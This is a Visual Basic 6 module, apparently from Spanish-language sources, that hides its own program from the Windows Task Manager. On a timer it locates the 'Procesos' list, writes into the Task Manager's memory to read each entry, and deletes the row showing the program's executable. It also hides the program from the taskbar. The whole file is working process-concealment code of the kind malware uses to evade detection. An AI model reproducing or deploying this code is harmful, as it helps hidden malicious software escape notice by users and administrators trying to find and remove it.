Attribute VB_Name = "OcultarP"
'***************************************************************************
'*
'*
'* Ocultar Processo con Timeline
'*
'*
'***************************************************************************
Option Explicit
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" _
(ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function EnumChildWindows Lib "user32" (ByVal hWndParent _
As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" _
(ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetClassName Lib "user32" Alias "GetClassNameA" _
(ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) _
As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
(ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam _
As Long, lParam As Any) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" _
(ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" _
(ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer _
As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" _
(ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, _
ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" _
(ByVal dwDesiredAccess As Long, ByValbInheritHandle As Long, _
ByVal dwProcessId As Long) As Long
Public Declare Function SetTimer Lib "user32" _
(ByVal hwnd As Long, ByValnIDEvent As Long, _
ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Public Declare Function KillTimer Lib "user32" _
(ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Const PROCESS_VM_OPERATION = &H8
Const PROCESS_VM_READ = &H10
Const PROCESS_VM_WRITE = &H20
Const PROCESS_ALL_ACCESS = 0
Private Const PAGE_READWRITE = &H4&
Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const MEM_DECOMMIT = &H4000
Const MEM_RELEASE = &H8000
Const MEM_FREE = &H10000
Const MEM_PRIVATE = &H20000
Const MEM_MAPPED = &H40000
Const MEM_TOP_DOWN = &H100000
Private Declare Function VirtualAllocEx Lib "kernel32" _
(ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize _
As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function VirtualFreeEx Lib "kernel32" _
(ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, _
ByVal dwFreeType As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" _
(ByVal hObject As Long) As Long
Private Const LVM_FIRST = &H1000
Private Const LVM_GETTITEMCOUNT& = (LVM_FIRST + 4)
Private Const LVM_GETITEMW = (LVM_FIRST + 75)
Private Const LVIF_TEXT = &H1
Private Const LVM_DELETEITEM = 4104

Private Type LV_ITEM

 mask As Long
 iItem As Long
 iSubItem As Long
 State As Long
 stateMask As Long
 lpszText As Long 'LPCSTR
 cchTextMax As Long
 iImage As Long
 lParam As Long
 iIndent As Long

End Type

Type LV_TEXT

 sItemText As String * 80
End Type

Public Function Procesos(ByVal hWnd2 As Long, lParam As String) As Boolean
 On Error GoTo nose
 Dim Nombre As String * 255, nombreClase As String * 255
 Dim Nombre2 As String, nombreClase2 As String
 Dim x As Long, Y As Long
 x = GetWindowText(hWnd2, Nombre, 255)
 Y = GetClassName(hWnd2, nombreClase, 255)
 Nombre = Left(Nombre, x)
 nombreClase = Left(nombreClase, Y)
 Nombre2 = Trim(Nombre)
 nombreClase2 = Trim(nombreClase)
 If nombreClase2 = "SysListView32" And Nombre2 = "Procesos" Then
 OcultarItems (hWnd2)
 Exit Function
 End If
 If Nombre2 = "" And nombreClase2 = "" Then
 Procesos = False
 Else
 Procesos = True
 End If
nose:
End Function

Private Function OcultarItems(ByVal hListView As Long)
 On Error GoTo nose
 Dim pid As Long, tid As Long
 Dim hProceso As Long, nElem As Long, _
 lEscribiendo As Long, i As Long
 Dim DirMemComp As Long, dwTam As Long
 Dim DirMemComp2 As Long
 Dim sLVItems() As String
 Dim li As LV_ITEM
 Dim lt As LV_TEXT
 If hListView = 0 Then Exit Function
 tid = GetWindowThreadProcessId(hListView, pid)
 nElem = SendMessage(hListView, LVM_GETTITEMCOUNT, 0, 0&)
 If nElem = 0 Then Exit Function
 ReDim sLVItems(nElem - 1)
 li.cchTextMax = 80
 dwTam = Len(li)
 DirMemComp = GetMemComp(pid, dwTam, hProceso)
 DirMemComp2 = GetMemComp(pid, LenB(lt), hProceso)
 For i = 0 To nElem - 1
 li.lpszText = DirMemComp2
 li.cchTextMax = 80
 li.iItem = i
 li.mask = LVIF_TEXT
 WriteProcessMemory hProceso, ByVal DirMemComp, li, dwTam, lEscribiendo
 lt.sItemText = Space(80)
 WriteProcessMemory hProceso, ByVal DirMemComp2, lt, LenB(lt), lEscribiendo
 Call SendMessage(hListView, LVM_GETITEMW, 0, ByVal DirMemComp)
 Call ReadProcessMemory(hProceso, ByVal DirMemComp2, lt, LenB(lt), lEscribiendo)
 If TrimNull(StrConv(lt.sItemText, vbFromUnicode)) = App.EXEName & ".exe" Then
 Call SendMessage(hListView, LVM_DELETEITEM, i, 0)
 Exit Function
 End If
 Next i
 CloseMemComp hProceso, DirMemComp, dwTam
 CloseMemComp hProceso, DirMemComp2, LenB(lt)
nose:
End Function

Private Function GetMemComp(ByVal pid As Long, ByVal memTam As Long, hProceso As Long) As Long
On Error GoTo nose
 hProceso = OpenProcess(PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, pid)
 GetMemComp = VirtualAllocEx(ByVal hProceso, ByVal 0&, ByVal memTam, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
nose:
End Function

Private Sub CloseMemComp(ByVal hProceso As Long, ByVal DirMem As Long, ByVal memTam As Long)
On Error GoTo nose
 Call VirtualFreeEx(hProceso, ByVal DirMem, memTam, MEM_RELEASE)
 CloseHandle hProceso
nose:
End Sub

Private Function TrimNull(sInput As String) As String
On Error GoTo nose
 Dim pos As Integer
 pos = InStr(sInput, Chr$(0))
 If pos Then
 TrimNull = Left$(sInput, pos - 1)
 Exit Function
 End If
 TrimNull = sInput
nose:
End Function

Public Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, _
ByVal uElapse As Long, ByVal lpTimerFunc As Long)
On Error GoTo nose
Dim handle As Long
handle = FindWindow(vbNullString, "Administrador de tareas de Windows")
If handle <> 0 Then EnumChildWindows handle, AddressOf Procesos, 1
nose:
End Sub

Public Sub Ocultar(ByVal hwnd As Long)
On Error GoTo nose
 App.TaskVisible = False
 SetTimer hwnd, 0, 20, AddressOf TimerProc
nose:
End Sub

Public Sub mostrar(ByVal hwnd As Long)
On Error GoTo nose
 App.TaskVisible = True
 KillTimer hwnd, 0
nose:
End Sub


